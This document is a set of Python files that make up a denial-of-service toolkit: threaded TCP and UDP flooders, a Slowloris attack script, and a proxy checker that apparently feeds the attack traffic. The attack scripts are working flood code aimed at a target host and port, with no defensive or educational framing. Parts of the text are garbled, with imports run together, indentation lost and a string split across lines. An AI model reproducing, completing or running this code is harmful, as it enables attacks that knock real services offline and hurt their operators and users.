tcp.py

import socket import threading import random import time

def attack(target, port, threads): print(f"[TCP] Attack started on {target}:{port} with {threads} threads")

def tcp_flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            packet = random._urandom(1024)
            for _ in range(100):
                s.send(packet)
            s.close()
            print(f"[TCP] Packet sent to {target}:{port}")
        except Exception:
            pass

for _ in range(threads):
    t = threading.Thread(target=tcp_flood)
    t.daemon = True
    t.start()

udp.py

import socket import threading import random

def attack(target, port, threads): print(f"[UDP] Attack started on {target}:{port} with {threads} threads") payload = random._urandom(1024)

def udp_flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(payload, (target, port))
            print(f"[UDP] Packet sent to {target}:{port}")
        except Exception:
            pass

for _ in range(threads):
    t = threading.Thread(target=udp_flood)
    t.daemon = True
    t.start()

slowloris.py

import socket import threading import random

def attack(target, threads): print(f"[Slowloris] Attack started on {target} with {threads} threads")

def slowloris():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        s.send("GET / HTTP/1.1\r\nHost: {}\r\n".format(target).encode())
        while True:
            try:
                s.send("X-a: {}

\n".format(random.randint(1, 5000)).encode()) time.sleep(10) print(f"[Slowloris] Header sent to {target}") except Exception: s.close() break except Exception: pass

for _ in range(threads):
    t = threading.Thread(target=slowloris)
    t.daemon = True
    t.start()

proxy_checker.py

import requests from concurrent.futures import ThreadPoolExecutor

def load_proxies(): try: with open("proxies/proxy.txt", "r") as file: proxies = file.readlines() print(f"[Proxy Checker] Loaded {len(proxies)} proxies")

def check(proxy):
        try:
            response = requests.get("http://ip-api.com/json", proxies={"http": f"http://{proxy.strip()}", "https": f"http://{proxy.strip()}"}, timeout=3)
            if response.status_code == 200:
                with open("proxies/working_proxies.txt", "a") as wf:
                    wf.write(proxy)
                print(f"[Proxy Checker] Working: {proxy.strip()}")
        except:
            pass

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(check, proxies)

except FileNotFoundError:
    print("[Proxy Checker] proxy.txt not found.")

